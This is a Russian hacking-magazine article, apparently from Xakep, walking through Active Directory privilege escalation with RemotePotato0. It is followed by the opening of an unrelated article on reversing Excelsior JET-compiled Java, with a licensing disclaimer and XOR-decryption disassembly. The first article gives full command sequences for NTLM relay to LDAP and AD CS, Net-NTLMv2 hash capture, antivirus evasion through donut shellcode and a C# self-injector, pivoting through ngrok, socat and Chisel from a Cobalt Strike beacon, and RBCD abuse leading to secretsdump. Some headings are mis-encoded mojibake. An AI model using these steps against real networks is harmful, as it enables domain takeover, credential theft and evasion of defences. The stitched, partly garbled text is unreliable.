RemotePotato0 — успешный резуль тат попыт ки расширить область примене-
ния RoguePotato для проведения атак на домен ные учет ные записи.
   Работает это примерно так же, как и RoguePotato, за исключением того, что
теперь мы исполь зуем дру гие службы (с дру гими значениями CLSID), чтобы
триг герить NTLM-аутен тификации от имени поль зователей, сессии которых
существу ют на атакуемой машине одновремен но с нашей. Первоначаль ный
вариант эксплоита работал толь ко при условии действия атакующего из так
называемого нулевого сеан са.




Session 0 Isolation — кон цепция разделения сессий поль зователей и сессий
системных служб и неин терак тивных приложений. Начиная с Windows Vista, все
поль зователи, под ключаясь к машине удален но по протоколу RDP, провали-
вают ся в свою сессию, отку да не могут взаимодействовать с процессами,
запущен ными в дру гих сессиях, если не обладают правами локаль ного адми-
нистратора. Однако если поль зователь под ключен через службу WinRM
(Windows Remote Management, 5985–5986/TCP) или SSH, то он проваливает ся
непосредствен но в нулевой сеанс, так как сами указан ные службы существу ют
имен но там.
   Наг лядный пример: поль зователь TINYCORP\j.doe в моей лабе не имеет
прав локалад мина на сервере TEXAS, поэтому не может видеть запущен ных
от имени администратора процессов Google Chrome, будучи под ключен ным
по RDP. Однако, если открыть диспетчер задач с правами администратора, эти
процессы будут отображены.





             Запуск диспетчера задач с разными правами

С дру гой стороны, если я включу этого поль зователя в локаль ную группу
Remote Management Users на этом сервере и под ключусь  к нему
с помощью Evil-WinRM , я окажусь в кон тек сте Session 0, по-прежнему
не обладая правами локалад мина.





                    Внут ри нулевого сеан са по WinRM

Это не означает, что я теперь могу делать с процессами в дру гих сессиях все,
что захочу, однако откры вает интересные возможности в плане взаимодей-
ствия с ними через DCOM/RPC.


То есть в ситу ации, ког да у нас есть поль зователь с правами под ключения
к серверам в кон тек сте нулевого сеан са через WinRM или SSH (то есть вхо-
дящий в группу Remote Management Users), но не обладающий правами
локаль ного администратора (в противном слу чае мы можем просто сдам пить
LSASS для  получения нужных кредов), можно было исполь зовать трюк
с RemotePotato0 при условии существования на атакуемом сервере сессий
привилегирован ных поль зователей. По словам автора эксплоита, в этом слу чае
при триг гере NTLM-аутен тификации через определен ный CLSID мы сможем
угнать кон текст сессии ñ íàèìåíüøèì çíà ÷åíè åì åå èäåí òèôèêà òîðà :


            If we have a shell in Session 0, even as a low privileged user, and trigger
       these  particular CLSIDs, we  will  obtain an NTLM  authentication  from«
       the  user  who   is  interactively  connected   (if  more  than  one  user
         is interactively connected, we will get that of the user with lowest session
         id).                »
Понят но, что при таком раскладе область применимости RemotePotato0 была
не очень широкой, поэтому хайпа вок руг метода было нем ного.
   Спустя некоторое время эксплоит, ко всеобщей радости, обновился и стал
под держивать фун кции êðîññ‑ñåññèîí íîãî триг гера NTLM-аутен тификации:
это означает, что, действуя даже в рам ках сессии номер 1 из RDP, мы можем
дернуть привилегирован ный кон текст администратора, так же залогинен ного
в RDP, но в сессии номер 2.
  И вот это уже было прямо пуш кой!


Êàê ðàáîòàåò è êîãäà èñïîëüçîâàòü
Перед переходом к прак тике сум миру ем наши знания о RemotePotato0.
   Условия применимости атаки, или чем нам нужно обладать:
 1. Ском прометирован ная домен ная УЗ, имеющая привилегии под ключения
   к удален ному серверу по протоколу RDP, где потен циаль но могут тусить
   привилегирован ные поль зователи. На самом деле это условие встречает ся
   прак тически везде, так как везде есть терминаль ники, куда время от вре-
  мени заг лядывают доменад мины.
 2. Под кон троль ный атакующему хост в интранете, имеющий сетевую связан -
   ность по порту 135/TCP с атакуемым сервером (от этого условия мы изба-
  вим ся далее).
 3. Незащищен ный эндпоинт с домен ной аутен тификацией, куда можно реле-
   ить Net-NTLMv2-аутен тификацию, прилетевшую на наш HTTP-сервер. Иде-
   аль ный вариант — службы LDAP(S) или стан дартное веб-приложение кор-
   поративного цен тра сертификации Microsoft AD CS.
 4. Возможность исполнения эксплоита RemotePotato0 на атакуемом сервере
   в обход средств антивирусной защиты.

Как работает атака:
 1. Действуя из сессии непривилегирован ного поль зователя, под ключен ного
   по RDP к серверу, где есть сессия привилегирован ного (или любого дру -
   гого интересу ющего нас) домен ного поль зователя, атакующий триг герит
   NTLM-аутен тификацию от имени жертвы через анмаршалинг вредоносного
   объекта COM-класса IStorage посредством передачи его в качестве
   аргу мен та в API-хендл CoGetInstanceFromIStorage. Во вредоносном
   объекте живет IP-адрес и порт под кон троль ного атакующему сетевого узла,
   куда позже прилетит NTLM-аутен тификация.
 2. На   своем   сервере   атакующий   зеркалит   трафло,   пришед шее
   на порт 135/TCP, обратно на атакуемую машину в порт, где уже под нят
  фейковый OXID-резолвер, который отдает запросу DCOM нужный RPC-
   бин динг.
 3. Частично повторяется шаг 4 из описания работы RoguePotato: вызов
  IRemUnknown2::RemRelease в отношении локаль ного RPC-сервера,
   инкапсу ляция RPC-запроса с NTLM-аутен тификацией в HTTP и перенап-
   равление его на наш HTTP-сервер. Последний уже под нят на машине ата-
  кующего в виде инстан са ntlmrelayx.py.
 4. Проведение кросс-протоколь ной атаки NTLM  Relay на незащищен ный
   эндпоинт с домен ной аутен тификацией. В этом слу чае атакующий может
   добавить под кон троль ного ему домен ного поль зователя в привилегирован -
  ные домен ные группы безопасности, настроить ограничен ное делегирова-
   ние на основе ресурсов RBCD Abuse для критических домен ных ресурсов
   или  исполь зовать  любой  дру гой  под держиваемый  век тор  атаки
    ntlmrelayx.py.





  Механизм работы RemotePotato0 (изображение — www.sentinelone.com)

Перейдем к прак тике.


Ñôåðè÷åñêèå ïðèìåðû â âàêóóìå
Прежде чем говорить об уклонении от AV и дру гих апгрейдах, посмотрим
на атаку при отключен ных средствах защиты, чтобы понимать, какого резуль -
тата нам ожидать.
  Я заг ружу свежий релиз RemotePotato0 и распакую его прямо на целевом
сервере.



 PS > curl
 https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/R
 emotePotato0.zip -o RemotePotato0.zip
 PS > Expand-Archive .\RemotePotato0.zip -DestinationPath .
 PS > ls .\RemotePotato0*
 PS > .\RemotePotato0.exe





                  Заг рузка и распаковка RemotePotato0

Как можно видеть из справки, в нашем распоряжении несколь ко режимов ата-
ки: можно либо отправить аутен тификацию на relay-сервер для ее перенап-
равления на дру гой эндпоинт (режим 0, по умолчанию), либо получить зна-
чение  хеша  Net-NTLMv2  для  его  офлайнового  перебора  (режим  2).
Режимы 1 и 3 пред назначены для триг гера NTLM-аутен тификации вручную,
без «картошки», поэтому нам это не очень интересно.
   Для разминки сперва попробу ем режим 2:
 • -m — режим атаки;
 • -x — IP-адрес TCP-редирек тора, который отзеркалит OXID-резолв обратно
  машине-жертве на порт, указан ный в опции -p (если бы я исполь зовал
   Windows Server 2012, можно было бы обойтись без этой опции, посколь ку
   на нем нет фик сов, запрещающих резолв OXID-запросов через нестандар-
   тные порты);
 • -p — порт фейкового локаль ного OXID-резолвера, куда OXID-запрос будет
   отзеркален машиной атакующего;
 • -s — номер сессии поль зователя, которого мы хотим олицет ворить.



 ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9998
 PS > .\RemotePotato0.exe -m 2 -x  -p 9998 -s





             Запуск RemotePotato0 в режиме сбора хешей

Как видим, мы успешно получили значение хеша Net-NTLMv2, который теперь
можно спокойно бру тить в офлайне (режим 5600 hashcat тебе в помощь).
Это полноцен ная замена атаки Internal Monologue, не требующая к тому же
прав локаль ного администратора.
   Теперь перейдем к релею на LDAP. Опции те же самые, толь ко добавим
флаг -r, задающий IP-адрес HTTP-сервера атакующего, который проведет
NTLM Relay.



 ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::9998
 ~$ sudo ntlmrelayx.py -t ldap:// --no-smb-server --no-wcf-server --
 no-raw-server --escalate-user
 PS > .\RemotePotato0.exe -m 0 -r  -x  -p 9998 -s





               Запуск RemotePotato0 в режиме релея

Вжух, и одной коман дой мы энтырпрайз одмены!


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИCOVERSTORY




                 ПОВЫШАЕМ ПРИВИЛЕГИИ В AD
                   ПРИ ПОМОЩИ REMOTEPOTATO0





ÁÎÅÂÀß ÏÐÀÊÒÈÊÀ

Это все, конечно, здорово, но совсем не жизненно.
   Усложним задачу: нужно провести ту же атаку при активном дефен дере и не
обладая вспомогатель ной машиной на Linux, на которой под нимается TCP-
редирек тор (допустим, мы проломили внеш ний периметр и оказались внут ри
корпоративной инфраструк туры с сессией Cobalt Strike).


Óêëîíÿåìñÿ îò AV
Су дя по моему опы ту, боль шинство аверов детек тят RemotePotato0.exe, осно-
вываясь исключитель но на сиг натурном анализе:


rule SentinelOne_RemotePotato0_privesc {
    meta:
        author = "SentinelOne"
        description = "Detects RemotePotato0 binary"
        reference = "https://labs.sentinelone.com/
relaying-potatoes-dce-rpc-ntlm-relay-eop"


    strings:
        $import1 = "CoGetInstanceFromIStorage"
        $istorage_clsid = "{00000306-0000-0000-c000-000000000046}"
 nocase wide ascii
        $meow_header = { 4d 45 4f 57 }
        $clsid1 = "{11111111-2222-3333-4444-555555555555}" nocase
wide ascii
        $clsid2 = "{5167B42F-C111-47A1-ACC4-8EABE61B0B54}" nocase
wide ascii


    condition:
        (uint16( 0 ) == 0x5A4D) and $import1 and $istorage_clsid and
$meow_header and 1 of ($clsid*)
}

Есть несколь ко возможных решений этой проблемы:
 1. Упаковать RemotePotato0.exe с помощью какого-нибудь архиватора/энко-
  дера/шифратора.
 2. Вы дернуть шелл-код из исполняемого файла и внед рить его в процесс
   из памяти.

На самом деле второй способ — это оверкилл, потому что против Windows
Defender работает даже упаковка UPX’ом .





             Defender Advanced (ага, да) Evasion UPX-упаковкой

Но мы можем лучше: второй способ не пот ребу ет даже заг ружать исполня-
емый файл эксплоита на диск, поэтому выбираем этот метод.




                   В прош лой статье я писал о бес шумном внед -
                      рении шелл-кода в память уда ленных процес сов
                        с помощью механизма D/Invoke.


Помимо D/Invoke, существу ет еще один интересный способ обфускации
вызовов Win32 API при написании эксплоитов на C#. Он освещен в статье
Unmanaged Code Execution with .NET Dynamic PInvoke.
   Суть проста: в C# существу ет нативный механизм System.Reection.Emit ,
позволяющий на лету создавать сборки .NET и исполнять их с помощью
механизма Reflection.Assembly из памяти прямо в ран тайме. Исполь зуя
этот механизм, мы можем так же на лету строить обертки для вызовов Win32
API, не прибегая к статическим дек ларациям P/Invoke.
  Пример определения фун кции CreateThread, дергающей одноимен ную
ручку API из kernel32.dll:


class DPInvoke
{
    static object DynamicPInvokeBuilder(Type type, string library,
string method, object[] parameters, Type[] parameterTypes)
    {
        AssemblyName assemblyName = new AssemblyName("Temp01");
        AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.
DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder moduleBuilder = assemblyBuilder.
DefineDynamicModule("Temp02");


        MethodBuilder methodBuilder = moduleBuilder.
DefinePInvokeMethod(method, library, MethodAttributes.Public |
MethodAttributes.Static | MethodAttributes.PinvokeImpl,
CallingConventions.Standard, type, parameterTypes,
CallingConvention.Winapi, CharSet.Ansi);


        methodBuilder.SetImplementationFlags(methodBuilder.
GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig)
;
        moduleBuilder.CreateGlobalFunctions();


        MethodInfo dynamicMethod = moduleBuilder.GetMethod(method)
;
        object result = dynamicMethod.Invoke(null, parameters);


        return result;
    }


    public static IntPtr CreateThread(IntPtr lpThreadAttributes,
uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId)
    {
        Type[] parameterTypes = { typeof(IntPtr), typeof(uint),
typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
        object[] parameters = { lpThreadAttributes, dwStackSize,
lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
        var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr),
"kernel32.dll", "CreateThread", parameters, parameterTypes);
        return result;
    }
}

На основе примеров из статьи по ссылке выше я напилил шаблон для авто-
матизации создания self-инжекторов. Шелл-коды генерируют ся из PE-файлов
с помощью этого форка проекта donut.
   Для ком пиляции .NET пот ребу ется машина с Visual Studio.


~ $ wget -q https://github.com/antonioCoco/RemotePotato0/releases/
download/1.2/RemotePotato0.zip
~$ unzip RemotePotato0.zip
~ $ ./donut -i RemotePotato0.exe -b= 1 -t -p '-m 2 -x <ATTACKER_IP>
-p 9998 -s <SESSION_ID>' -o RemotePotato0.bin
PS > $binaryName = "RemotePotato0"
PS > $bytes = [System.IO.File]::ReadAllBytes("$(pwd)\${
binaryName}.bin")
PS > [System.IO.MemoryStream] $outStream = New-Object System.IO.
MemoryStream
PS > $dStream = New-Object System.IO.Compression.DeflateStream(
$outStream , [System.IO.Compression.CompressionLevel]::Optimal)
PS > $dStream.Write($bytes , 0, $bytes.Length)
PS > $dStream.Dispose()
PS > $outBytes = $outStream.ToArray()
PS > $outStream.Dispose()
PS > $b64Compressed = [System.Convert]::ToBase64String($outBytes)
PS > $template = (New-Object Net.WebClient).DownloadString(
"https://gist.github.com/snovvcrash/
30bd25b1a5a18d8bb7ce3bb8dc2bae37/raw/
881ec72c7c310bc07af017656a47d0c659fab4f6/template.cs") -creplace
'DONUT' , $b64Compressed
PS > $template -creplace 'NAMESPACE' , "${binaryName}Inject" > ${
binaryName}Inject.cs
PS > csc /t:exe /platform:x64 /out:${binaryName}Inject.exe ${
binaryName}Inject.cs
PS > rm ${binaryName}Inject.cs





                   Ком пиляция self-инжектора

Протестим его в следующем разделе, ког да решим проблему с TCP-редирек -
тором.


ngrok + socat =
Допустим, мы получили «маячок» CS на уязвимом для атаки сервере, но у нас
нет дру гого ресурса во внут ренней сети жертвы, чтобы исполь зовать его
как зеркало для OXID-запросов.
   Для имитации этой ситу ации я вру бил обратно «Дефен дер», восполь зовал-
ся своим волшебным инжектором с позаимствован ной у @_RastaMouse тех-
никой Module Stomping и получил сессию «Кобы».





                    Ничего подозритель ного





                            You’ve poped a shell!

Теперь нем ного pivoting: отсутствие вспомогатель ной машины я ком пенсирую
тем,  что  под ниму  TCP-инстанс ngrok ,  который  даст  белый  эндпоинт
для общения с машиной атакующего (которая находит ся за пределами внут -
ренней сети).



 ~$ ngrok tcp 136





                         ngrok слу шает на 136/TCP

Так как мы не можем кон тролировать порт, который ngrok вешает на «белый»
адрес (а нам нужен толь ко 135/TCP), понадобит ся еще один редирек тор. В его
роли выступит socat на моей VDS (на атакуемом сервере должен быть доступ
в интернеты, чтобы до него достучать ся).



 ~$ nslookup
 ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::





                            ngrok + socat на VDS

Теперь я могу ловить на 136/TCP на машине атакера трафик, прилетевший
с ngrok, и перенаправлять его обратно на жертву. В этом мне поможет SOCKS-
прок ся, разверну тая «Кобой».
  Эм пирическим путем было установлено, что прок сю лучше под нимать
в отдель ном биконе, так как изначаль ная сессия начинает тупить, ког да мы
делаем execute-assembly с нашим инжектором, который мы, кстати, так и не
протестили. Исправим это (теперь надо толь ко перегенерить шелл-код с нуж-
ным IP VDS’ки в аргу мен те -x).



 beacon(1)> socks 1080
 ~$ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,reuseaddr
 TCP::9998
 beacon(2)> execute-assembly RemotePotato0Inject.exe





                        А вот и хешики!





                      Тем временем на VDS

Но и это не предел наших возможностей — таким же способом можно зареле-
ить аутен тификацию на LDAP. Для начала перегенерим шелл-код с нужными
нам аргу мен тами (изменим режим в -m и добавим адрес VDS в -r).



 ~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r  -x  -p 9998 -s
  ' -o RemotePotato0.bin


К сожалению, в бесплат ной версии ngrok не получит ся одновремен но под нять
второй канал, поэтому я восполь зуюсь Chisel для перенаправления HTTP-
трафла. Откровен но говоря, можно было и первый редирект настроить через
chisel и не юзать ngrok вообще.




                Мы под робно рас смат ривали  Chisel, ког да ре-
                    шали одну из тачек на Hack The Box.



beacon( 1 )> socks 1080
(ATTACKER) ~ $ ngrok tcp 136
( VDS ) ~ $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_
IP>:<NGROK_PORT>
( VDS ) ~ $ sudo ./chisel server -p 8000 --reverse --auth <USER>:<
PASS>
(ATTACKER) ~ $ ./chisel client --auth <USER>:<PASS> <VDS_IP>:8000
R:80:127.0.0.1:8080
(ATTACKER) ~ $ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,
reuseaddr TCP:<VICTIM_INTERNAL_IP>:9998
(ATTACKER) ~ $ sudo proxychains4 -q ntlmrelayx.py -t ldap://<DC_
INTERNAL_IP> --http-port 8080 --no-smb-server --no-wcf-server
--no-raw-server --escalate-user <PWNED_USER>
beacon( 2 )> execute-assembly RemotePotato0Inject.exe





                     Релеим HTTP через Chisel





                  Тем временем на VDS (дубль 2)

И я снова энтерпрайз-админ. Таким образом, мы скрафтили способ повыше-
ния привилегий с помощью RemotePotato0 без исполь зования вспомогатель -
ного хоста на внут реннем перимет ре!


ÁÎÍÓÑ #1. ÐÅËÅÉ ÍÀ AD CS (ESC8)

Если релеить на LDAP(S) не получается, но в домене есть незащищен ный
эндпоинт Web Enrollment цен тра сертификации AD CS, можно провернуть вари-
ацию атаки ESC8 (за под робностями идем в ресерч Certied Pre-Owned).
   Чтобы релей сработал в этом слу чае, может пот ребовать ся поиг рать с раз-
ными значениями CLSID, которые можно указать через аргу мент -c. Захардко-
жен ное значение {5167B42F-C111-47A1-ACC4-8EABE61B0B54} не сработает
из-за того, что разные службы (с разными CLSID) исполь зуют разные уровни
аутен тификации при их триг гере по RPC (определяется значением этих кон -
стант ). То, что работает при релее на LDAP, может не сработать при релее
на SMB/HTTP (в слу чае ESC8 релеим имен но на HTTP).
   Так вот, опять же эмпирическим путем выяснено, что для ESC8 под ходит
служба CastServerInteractiveUser со значением CLSID {f8842f8e-dafe-4b37-
9d38-4e0714a61149}.
  Продемонстрировать со скрин шотом, к сожалению, не получит ся, посколь -
ку в моей лабе сервер TEXAS и играет роль AD CS, а reective-релей с самого
себя не сработает.





                            Вот вам пруф

Но в коман дах это должно было бы выг лядеть примерно так.



 ~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r  -x  -p 9998 -s
 -c {f8842f8e-dafe-4b37-9d38-4e0714a61149}' -o RemotePotato0.bin
 ~$ ntlmrelayx.py -t http:///certsrv/certfnsh.asp --no-smb-server --
 no-wcf-server --no-raw-server --adcs --template User


При успешной генерации сертификата от имени атакован ного поль зователя
даль ше действу ем обычно, как это происходит после ESC8-атаки, а имен но
исполь зуем Rubeus (флаг /getcredentials) или PKINITtools для получения
TGT или NT-хеша жертвы.


ÁÎÍÓÑ #2. REMOTEPOTATO ÁÅÇ REMOTEPOTATO0.EXE

В репозитории Impacket ждет своего часа  pull request , избавляющий нас
от необходимости тащить на атакуемый хост RemotePotato0.exe: триг гер
NTLM-аутен тификации перенесли в этот форк SweetPotato, RPC-сервер реали-
зовали в самом ntlmrelayx.py, а OXID-резолвер вынесли в отдель ный скрипт
rpcoxidresolver.py. Однако в этом слу чае самые вкусные фун кции не будут
работать — триг герить NTLM-аутен тификацию можно толь ко от имени машин -
ной УЗ, но не сквозь чужую сессию.
  Я покажу способ воору жить и этот вариант атаки, имея под рукой толь ко
бикон «Кобы» и инстанс VDS, через классическую реализацию RBCD-àáüþçà
для пывна сервера, отку да прилетает аутен тификация.
   Для этого сначала определим ся, что, куда и зачем мы редирек тим:
 1. С помощью  ngrok  создаем TCP-канал извне до localhost:135 .  Так
   как RPC-сервер теперь кру тит ся на машине атакующего, нам не нужно
   ничего зеркалить вторым socat — достаточно запустить rpcoxidresolver.py,
   который уже слу шает localhost:135 .
 2. С помощью Chisel пробрасываем порт 9997 с VDS на порт машины ата-
  кующего 9998, который слу шает RPC-сервер  ntlmrelayx.py. В качестве
   адреса RPC-сервера в rpcoxidresolver.py (опция -rip ) указываем IP нашего
  VDS —  это нужно для  того,  чтобы  передать NTLM-аутен тификацию
   в  ntlmrelayx.py  (при исполь зовании адреса 127.0.0.1  эта конструк ция
   работать отказывается).
 3. ntlmrelayx.py пускаем через прок сю CS для релея на службу LDAPS кон трол-
   лера домена. Да, на LDAPS, потому что, применяя релей, мы хотим настро-
   ить делегирование относитель но вспомогатель ной сервисной УЗ, которую
   нель зя создать по LDAP.
 4. Стреляем SweetPotato.exe из CS с триг гером CLSID {42CBFAA7-A4A7-
  47BB-B422-BD10E9D02700}, пред лагаемого автором PR.



 beacon(1)> socks 1080
 (ATTACKER) ~ngroktcp135(VDS) sudo socat -v TCP-
 LISTEN:135,fork,reuseaddr TCP: :
 (VDS) ~$ sudo ./chisel server -p 6666 --reverse --auth :
 (ATTACKER) ~$ ./chisel client --auth : :6666 R:9997:127.0.0.1:9998
 (ATTACKER) ~$ python examples/rpcoxidresolver.py -oip 127.0.0.1 -rip
 -rport 9997
 (ATTACKER) ~$ proxychains4 -q python examples/ntlmrelayx.py -t
 ldaps:// --rpc-port 9998 -smb2support --no-smb-server --no-http-
 server --no-wcf-server --no-raw-server --no-da --no-acl --delegate-
 access
 beacon(2)> execute-assembly SweetPotato.exe -e 1 -oip  -c 42CBFAA7-
 A4A7-47BB-B422-BD10E9D02700





                            S4U2Proxy, я иду!

После этого, полагаю, не нужно объяснять, что делать даль ше.
  Получаем TGS-билет через тран зитные расширения Kerberos (S4U2Self &
S4U2Proxy) с опцией имперсонации поль зователя  administrator  (getST.py )
и фигачим secretsdump.py /wmiexec.py, чтобы извлечь сек реты LSA или получить
шелл на сервере.





             Теперь мы закон ные админы на сервере TEXAS

Приколь ный вариант атаки, но протащить и выполнить оригиналь ный бинарь,
как мы показали ранее, тоже не составляет боль шого тру да.
ВЗЛОМ





        ИЗУЧАЕМ ЗАЩИТУ EXCELSIOR JET
              ДЛЯ ПРОГРАММ НА JAVA



На какие только ухищ рения не при ходит ся
идти раз работ чикам прог рамм на Java,
что бы усложнить взлом и реверс! Одна ко
у всех подобных при ложений есть сла бое
место: в определен ный момент исполне-           МВК
ния прог рамма дол жна быть переда на
в JVM в исходных байт-кодах, дизассем -
бли ровать которые очень просто. Что бы
избежать это го, некото рые прог раммисты
вов се  избавля ются  от  JVM-байт-кода.
Как хакеры обыч но поступа ют в таких слу -
чаях? Сей час раз берем ся!




                       Статья  написа на  в исследова тельских  целях,
                    имеет озна коми тельный характер и пред назна -
                       чена для специалис тов по безопас ности. Автор
                      и редакция не несут ответс твенности за любой
                        вред, при чиненный с при менением изложенной
                     информа ции. Использование  или  рас простра -
                      нение ПО без лицензии производителя может
                       прес ледоваться по закону.


Авторы одной прог раммы, суровые сибирские прог раммисты, решили пос-
тупить совсем радикаль ным способом: ском пилировали Java-код в натив, при-
чем (по их собствен ному утверждению) с обфускацией и оптимизацией, как бы
противоречиво это ни зву чало. Фак тически они пожертвовали кросс-плат -
формен ностью (ну и зачем она, спрашивается, нужна в уже ском пилирован ной
прог рамме, заточен ной под определен ную архитек туру?).
  Уж не знаю, насколь ко такой под ход способству ет оптимизации, — иссле-
дован ное мной приложение чертовски неторопливо и прожорливо к ресурсам
компь ютера, а главное, занимает несколь ко сот мегабайт. Но реверс-инже-
нерам пред ложен ный разработ чиками под ход силь но усложняет жизнь. Лично
я не нашел в паблике внят ного ману ала по организации дан ных в таких прог -
раммах, и во многих обзорах эта технология считает ся лучшей для защиты
Java-приложений от взлома и декодин га. Называется она Excelsior JET.
   Что ж, попробу ем изу чить эту технологию при помощи под ручных средств.
В качестве подопыт ного кролика возь мем одно из офлайновых веб-приложе-
ний, о которых я многок ратно рассказывал в своих стать ях. В качестве дизас-
сем блера по старой традиции восполь зуем ся IDA.
  Несмотря на то что код не запакован, не виртуализирован и прак тически
не обфусцирован, поначалу задача реверса кажет ся неподъемной — в дизас-
сем блирован ном коде напрочь  отсутству ют не  толь ко названия  классов
и методов, но и читаемые тек стовые строки. Между тем мы точно знаем, что
и строки, и названия классов, методов, и даже номера строк в коде все-таки
хранят ся.
  Дело в том, что прог рамма пишет в лог стек вызовов при возникновении
исключений — там присутству ют и полные названия методов с классами,
и даже имена исходных файлов Java, из которых они были ском пилированы
вместе с номерами строк, выполняющих вложен ные вызовы.
  Это вдохновило меня на даль нейшие поиски. Как минимум при входе
в каждый метод информация о нем каким-то образом должна заносить ся
в отладочный стек. Бег ло рассмот рев код, находим первую зацепку. На подав-
ляющем боль шинстве процедур начало кода выг лядит следующим образом
(схожие места помечены стрелкой):


                add     rsp, 0FFFFFFFFFFFFFFF8h
                mov     eax, [rsp-0C00h]              ; (1)
                lea     rax, unk_9EEDFC8              ; (2)
                mov     [rsp], rax                    ; (3)


                add     rsp, 0FFFFFFFFFFFFFFF8h
                mov     eax, [rsp+8+var_C08]         ; (1)
                lea     rax, unk_9F2E060              ; (2)
                mov     [rsp+8+var_8], rax            ; (3)


                push    rbx
                push    rbp
                push    rsi
                push    rdi
                push    r12
                push    r13
                push    r14
                add     rsp, 0FFFFFFFFFFFFFF60h
                mov     eax, [rsp+0D8h+var_CD8]      ; (1)
                lea     rax, unk_ABFB080              ; (2)
                mov     [rsp+0D8h+var_D8], rax       ; (3)


                push    rbx
                push    rbp
                push    rsi
                push    rdi
                push    r12
                push    r13
                push    r14
                add     rsp, 0FFFFFFFFFFFFFFC0h
                mov     eax, [rsp+78h+var_C78]        ; (1)
                lea     rax, unk_ABFB040               ; (2)
                mov     [rsp+78h+var_78], rax         ; (3)

Строка 1 чисто рудимен тарная и никакой полезной наг рузки (во всяком слу чае,
в приведен ных выше примерах) не несет. Здесь в eax присваивает ся зна-
чение, лежащее на стеке выше текущего положения на C00h байт. Можно
пред положить, что это своеобразная защита от переполнения, — при вызове
каждой процеду ры на стеке гаран тирован но должен быть запас из C00h байт.
  А вот следующие две строки вызывают интерес: при входе в каждую про-
цеду ру следом за адресом возврата на стек кладет ся адрес некоей струк туры,
причем он прак тически всег да уникаль ный. Струк тура эта не инициализиро-
вана при  заг рузке прог раммы,  поэтому придет ся под ключать  к  работе
отладчик.
   Здесь нас ожидает первая под ножка: наш любимый x64dbg не годит ся.
Не знаю и не хочу разбирать ся, специаль но ли это задумано авторами или ста-
ло следствием прожорливости  Excelsior  JET, но при запуске приложения
из x64dbg прог рамма сразу же кон чает жизнь самоубийством с пред смертным
сообщением о нехватке памяти. Приаттачить ся к работающей прог рамме мож-
но, однако работать она все равно не хочет, ссы лаясь на ту же самую проб-
лему.
  По  счастью,  создатели  старень кого  леген дарного  отладчика  OllyDbg
перед тем, как проект зак рылся, успели сделать тестовую 64-бит ную версию
своей прог раммы, очень сырую, с урезан ными возможностями, но не кон флик -
тующую с капризной и жад ной до ресурсов софтиной. Итак, заг ружаем иссле-
дуемую прог рамму в OllyDbg и останавливаем ее на начале любой из подоб-
ных процедур. Струк тура, ссылку на которую упорно кладут на стек, выг лядит
примерно так.





               Струк тура, ссылку на которую кладут на стек

Вид но, что у каждой процеду ры есть своя собствен ная запись размером 0x40
байт. Не знаю, как они правиль но называются, давай для удобства называть их
струк тура-40 по их размеру. Назначение полей этой струк туры малопонят но,
за исключением указателя на процеду ры (выделено синим) и по нулевому сме-
щению  указателя на дру гую,  более  интересную  струк туру,  выделен ную
зеленым. У сосед них записей ссылка на эту новую струк туру одинакова, и, если
присмотреть ся, в ней явно вид но полное имя класса. Струк тура инициализиро-
вана в исходном коде, но без имени класса и некоторых полей.





  Описатель класса, инициализирован ный в исходном коде (справа) и во
  время работы прог раммы (слева)

При первом же взгляде на блок дан ных в месте, где должно располагать ся имя
класса, возникают смут ные сом нения, что этот блок просто зашифрован
каким-то нехит рым шифром типа XOR. Дела прод вигаются: у нас наметились
уже два направления даль нейшей работы — определить соот ветствие про-
цедур классам в изначаль ном коде и расшифровать их имена.
   Как ни стран но, метод решения у этих задач один: ставим точку останова
типа Memory на интересный нам адрес и ждем в засаде, пока не поймает ся
изменяющий его кусок кода.
   Начнем с расшифровки имен классов. Ставим Memory breakpoint на пер-
вый байт строки java/ по адресу 72B7718 и запускаем прог рамму. Наша
ловуш ка сразу срабаты вает на простень кой процеду ре расшифровки:


            jmp     short loc_93A54A

На входе RCX-адрес зашифрован ной строки и RDX-адрес расшифрован ной
строки (в нашем слу чае исходный RCX). А еще R8-байт, с которым строка ксо-
рит ся, в нашем слу чае это F9h.


loc_93A542:                              ; CODE XREF:
sub_93A540+40↓j
                add     rcx, 1
                add     rdx, 1


loc_93A54A:                              ; CODE XREF: sub_93A540↑j
                movsx   eax, byte ptr [rcx]  ; EAX <- текущий
байт строки
                test    eax, eax
                jz      short loc_93A56F
                cmp     r8d, eax
                jz      short loc_93A561     ; Проверки на конец
строки — 0 или F9h
                mov     r9d, eax
                xor     eax, r8d              ; EAX <- EAX XOR R8D
                movsx   eax, al
                jmp     short loc_93A57B
; --------------------------------------


loc_93A561:                              ; CODE XREF:
sub_93A540+14↑j
                mov     r9d, eax
                mov     r10d, r9d
                mov     r9d, eax
                mov     eax, r10d
                jmp     short loc_93A57B
; --------------------------------------


loc_93A56F:                              ; CODE XREF:
sub_93A540+F↑j
                xor     r9d, r9d
                mov     r10d, r9d
                mov     r9d, eax
                mov     eax, r10d


loc_93A57B:                              ; CODE XREF:
sub_93A540+1F↑j
                                          ; sub_93A540+2D↑j
                mov     [rdx], al       ; Текущий байт <- новое
значение EAX
                test    r9d, r9d
                jnz     short loc_93A542
                retn

Пред чувствия нас не обманули: это простейший XOR с фик сирован ным байтом
F9h. Причем похоже, что названия всех описателей классов расшифровыва-
ются сразу в одной процеду ре при старте прог раммы. В таком слу чае попробу -
ем извлечь из нее список всех классов и положение строки имени класса
в струк туре описателя.


sub_9BA640      proc near     ; На входе RCX — адрес структуры
CDES


                ...
                movsx   edx, byte ptr [rcx+0ACh] ; По смещению
ACh в этой структуре байт-шифровальщик F9h
                mov     r8d, edx
                mov     rdx, rcx
                mov     rcx, rax
